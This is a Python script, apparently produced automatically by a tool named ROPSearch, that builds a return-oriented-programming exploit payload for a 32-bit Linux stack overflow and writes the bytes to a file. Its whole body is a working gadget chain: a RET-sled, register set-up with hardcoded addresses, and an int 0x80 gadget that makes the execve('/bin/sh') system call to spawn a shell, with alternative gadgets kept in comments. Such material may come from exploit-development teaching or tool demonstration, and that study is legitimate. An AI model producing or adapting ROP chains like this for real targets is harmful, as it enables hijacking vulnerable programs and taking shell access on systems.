# This script was generated automatically by the ROPSearch tool.
import os, pathlib

# Configuration options:
# Max length of each instruction sequence: 10
# Allow NULL bytes in payload: No
# Allow whitespace bytes in payload: Yes
# Ignore duplicate instruction sequence results: Yes
# Approximate total byte size of the stack variables/buffers that need to be overflowed: 100
# Maximum number of instruction sequence variants to output for each step: 5
# Number of acceptable padding bytes for a single instruction sequence: 100

# Init the payload
payload = b''

# ROP-chain for calling: execve("/bin/sh", NULL, NULL);
# Passing NULL for the args and environment is not portable but is allowed by some Linux versions.
if True:
    # RET-sled
    payload += b'\x7F\x15\x55\xEB' * 35 # 0xeb55157f: "ret"
    
    # Set to NULL.
    # ecx = 0x00000000
    if True:
        payload += b'\xE6\x10\x4F\xEB' # 0xeb4f10e6: xor ecx, ecx; mov eax, ecx; pop ebx; pop esi; ret
        payload += b'\xFF' * 8
        
        # payload += b'\xC0\x19\x3F\xEB' # 0xeb3f19c0: xor ecx, ecx; pop ebx; pop esi; mov eax, ecx; ret
        # payload += b'\xFF' * 8
        
        # payload += b'\xB3\xDB\x4D\xEB' # 0xeb4ddbb3: xor ecx, ecx; pop ebx; mov eax, ecx; pop esi; pop edi; pop ebp; ret
        # payload += b'\xFF' * 16
        
        # payload += b'\x3D\x1E\x4B\xEB' # 0xeb4b1e3d: xor ecx, ecx; add esp, 0xc; mov eax, ecx; pop ebx; pop esi; pop edi; pop ebp; ret
        # payload += b'\xFF' * 28
        
        # payload += b'\x70\x1E\x4B\xEB' # 0xeb4b1e70: xor ecx, ecx; jmp 0xeb4b1e3f --> add esp, 0xc; mov eax, ecx; pop ebx; pop esi; pop edi; pop ebp; ret
        # payload += b'\xFF' * 28
        
    # System call number for execve().
    # eax = 0x0000000b
    if True:
        payload += b'\x7E\xCE\x43\xEB' # 0xeb43ce7e: mov eax, 0xb; jmp 0xeb43cea4 --> pop ebx; pop esi; ret
        payload += b'\xFF' * 8
        
        # payload += b'\x8D\xD8\x43\xEB' # 0xeb43d88d: mov eax, 0xb; jmp 0xeb43d769 --> pop ebx; pop esi; pop edi; ret
        # payload += b'\xFF' * 12
        
        # payload += b'\x60\x14\x44\xEB' # 0xeb441460: mov eax, 0xb; jmp 0xeb4413fa --> pop ebx; pop esi; pop edi; ret
        # payload += b'\xFF' * 12
        
        # payload += b'\x21\xE6\x43\xEB' # 0xeb43e621: mov eax, 0xb; jmp 0xeb43e4d9 --> pop ebx; pop esi; pop edi; ret
        # payload += b'\xFF' * 12
        
        # payload += b'\xF2\xF6\x43\xEB' # 0xeb43f6f2: mov eax, 0xb; jmp 0xeb43f394 --> add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret
        # payload += b'\xFF' * 44
        
    # Set to NULL.
    # edx = 0x00000000
    if True:
        payload += b'\x25\x15\x3F\xEB' # 0xeb3f1525: xor edx, edx; pop ebx; ret
        payload += b'\xFF' * 4
        
        # payload += b'\x83\x72\x47\xEB' # 0xeb477283: xor edx, edx; add esp, 0x4c; pop ebx; pop esi; pop edi; pop ebp; ret
        # payload += b'\xFF' * 92
        
    # Address of "/bin/sh" in virtual memory.
    # ebx = 0xeb56cde8
    if True:
        payload += b'\xEA\x83\x54\xEB' # 0xeb5483ea: pop ebx; ret
        payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        
        # payload += b'\x8B\xE4\x47\xEB' # 0xeb47e48b: pop ebx; ret 4
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\x7F\x15\x55\xEB' # 0xeb55157f: ret
        # payload += b'\xFF' * 4
        
        # payload += b'\x45\x84\x51\xEB' # 0xeb518445: pop ebx; pop edi; ret
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\xFF' * 4
        
        # payload += b'\x32\x3E\x54\xEB' # 0xeb543e32: pop ebx; pop esi; ret
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\xFF' * 4
        
        # payload += b'\x59\xED\x44\xEB' # 0xeb44ed59: pop ebx; pop esi; ret 4
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\xFF' * 4
        # payload += b'\x7F\x15\x55\xEB' # 0xeb55157f: ret
        # payload += b'\xFF' * 4
        
    # Make the system call
    if True:
        payload += b'\x86\x17\x4B\xEB' # 0xeb4b1786: int 0x80; push ecx; cmp eax, 0xfffff001; jae 0xeb3d4e20; ret
    
# Change the CWD of the script to its own directory.
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

# Write the payload bytes to a file.
scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
    fout.write(payload)

